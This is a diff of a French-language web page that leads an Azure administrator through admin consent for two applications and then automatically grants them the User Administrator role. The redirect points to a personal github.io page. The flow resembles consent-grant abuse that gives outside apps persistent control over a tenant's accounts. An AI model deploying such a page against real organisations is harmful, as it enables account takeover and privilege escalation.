@@ -17,9 +17,12 @@
 <body>
   <h1>🔐 Consentement + Attribution de rôle – Deux Applications Azure</h1>
 
-  <div id="beforeStart">
-    <p>Ce processus accorde le consentement pour deux applications, puis leur attribue automatiquement le rôle <strong>User Administrator</strong>.</p>
-    <button onclick="startConsent()">✅ Démarrer le processus</button>
+  <p>
+    Ce processus vous permet d’accorder le <strong>consentement administrateur</strong> pour deux applications, puis d’attribuer automatiquement le rôle <strong>User Administrator</strong>.
+  </p>
+
+  <div id="start">
+    <button onclick="startConsent()">✅ Lancer le processus</button>
   </div>
 
   <div id="status" class="message"></div>
@@ -54,11 +57,12 @@
   };
 
   function startConsent() {
-  const redirectIntermediaire = 'https://zak413.github.io/test-bd/redirect.html';
-  const url = `https://login.microsoftonline.com/organizations/adminconsent?client_id=58deb25d-3881-4c76-863b-70e3fcb1739b&redirect_uri=${encodeURIComponent(redirectIntermediaire)}&state=step2`;
-  window.location.href = url;
-}
-
+    const redirectStep2 = 'https://zak413.github.io/test-bd/redirect.html';
+    const url = `https://login.microsoftonline.com/organizations/adminconsent?client_id=${app1ClientId}&redirect_uri=${encodeURIComponent(redirectStep2)}&state=step2`;
+    log('Redirection vers le consentement App 1...');
+    setStatus('🔗 Redirection vers App 1...');
+    window.location.href = url;
+  }
 
   async function assignRoleToApp(appClientId, token) {
     const graphUrl = 'https://graph.microsoft.com/v1.0';
@@ -131,11 +135,10 @@
     }
   }
 
-  // Si on revient après le consentement App 2
   const params = new URLSearchParams(window.location.search);
   if (params.get('state') === 'done') {
-    document.getElementById('beforeStart').style.display = 'none';
-    setStatus('✅ Consentements accordés. Attribution des rôles en cours...');
+    document.getElementById('start').style.display = 'none';
+    setStatus('✅ Consentements validés. Attribution des rôles...');
     assignRolesAfterConsent();
     window.history.replaceState({}, document.title, window.location.pathname);
   }
